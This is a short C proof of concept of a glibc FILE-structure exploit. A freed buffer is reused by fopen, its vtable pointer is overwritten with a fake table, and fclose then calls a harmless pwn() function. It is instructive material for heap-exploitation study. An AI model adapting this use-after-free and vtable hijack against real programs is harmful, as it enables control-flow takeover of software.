#include <stdio.h>
#include <stdlib.h>

void pwn(void)
{
    printf("Dave, my mind is going.\n");
    fflush(stdout);
}

void * funcs[] = {
    NULL, // "extra word"
    NULL, // DUMMY
    exit, // finish
    NULL, // overflow
    NULL, // underflow
    NULL, // uflow
    NULL, // pbackfail
    NULL, // xsputn
    NULL, // xsgetn
    NULL, // seekoff
    NULL, // seekpos
    NULL, // setbuf
    NULL, // sync
    NULL, // doallocate
    NULL, // read
    NULL, // write
    NULL, // seek
    pwn,  // close
    NULL, // stat
    NULL, // showmanyc
    NULL, // imbue
};

int main(int argc, char * argv[])
{   
    FILE *fp;
    unsigned char *str;

    printf("sizeof(FILE): 0x%x\n", sizeof(FILE));

    /* Allocate and free enough for a FILE plus a pointer. */
    str = malloc(sizeof(FILE) + sizeof(void *));
    printf("freeing %p\n", str);
    free(str);

    /* Open a file, observe it ended up at previous location. */
    if (!(fp = fopen("/dev/null", "r"))) {
        perror("fopen");
        return 1;
    }
    printf("FILE got %p\n", fp);
    printf("_IO_jump_t @ %p is 0x%08lx\n",
           str + sizeof(FILE), *(unsigned long*)(str + sizeof(FILE)));

    /* Overwrite vtable pointer. */
    *(unsigned long*)(str + sizeof(FILE)) = (unsigned long)funcs;
    printf("_IO_jump_t @ %p now 0x%08lx\n",
           str + sizeof(FILE), *(unsigned long*)(str + sizeof(FILE)));

    /* Trigger call to pwn(). */
    fclose(fp);

    return 0;
}

